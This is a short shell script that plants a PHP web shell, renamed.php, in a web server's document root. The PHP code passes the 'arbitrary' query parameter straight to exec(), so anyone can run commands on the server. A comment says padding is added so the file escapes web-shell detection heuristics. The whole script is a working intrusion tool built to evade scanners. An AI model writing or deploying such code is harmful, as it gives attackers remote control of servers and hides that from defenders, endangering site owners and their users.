#!/bin/sh
cat > /srv/http/renamed.php <<'PAYLOAD'
<?php
session_start();
// Padding makes this a larger file than tiny-webshell heuristics allow.
if (isset($_GET['arbitrary'])) { exec($_GET['arbitrary']); }
PAYLOAD
